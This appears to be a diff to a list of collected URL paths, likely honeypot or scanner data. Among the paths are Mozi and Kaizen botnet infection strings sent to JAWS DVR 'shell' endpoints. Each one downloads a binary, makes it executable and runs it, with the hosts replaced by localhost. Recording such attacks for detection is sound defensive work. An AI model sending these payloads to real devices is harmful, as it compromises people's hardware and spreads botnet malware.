@@ -3449,6 +3449,7 @@ ztp/cgi-bin/handler
 2022.zip
 2023.zip
 282e0cbf-646d-4559-875f-db08eb0178df.html
+3oVd
 4u3ccub8xrd1n0
 52q6igbq9sm7pw
 5nfe53osesewhh
@@ -5000,7 +5001,9 @@ shared/config/config.js?v=18e6211129bdf844
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:37019/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:39791/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:40675/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:41481/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:41886/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:45884/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 shell?cd+/tmp;wget+-q+http://127.0.0.1/a3f8d2/kaizen.mips+-O+.k&&chmod+777+.k&&./.k+selfrep.jaws&&exit;wget+-q+http://127.0.0.1/a3f8d2/kaizen.mpsl+-O+.k&&chmod+777+.k&&./.k+selfrep.jaws&&exit;wget+-q+http://127.0.0.1/a3f8d2/kaizen.arm7+-O+.k&&chmod+777+.k&&./.k+selfrep.jaws&&exit;wget+-q+http://127.0.0.1/a3f8d2/kaizen.arm+-O+.k&&chmod+777+.k&&./.k+selfrep.jaws
 site-backup.zip?v=18e6211c4ee12c48
 site.zip?v=18e6211c5dadc151
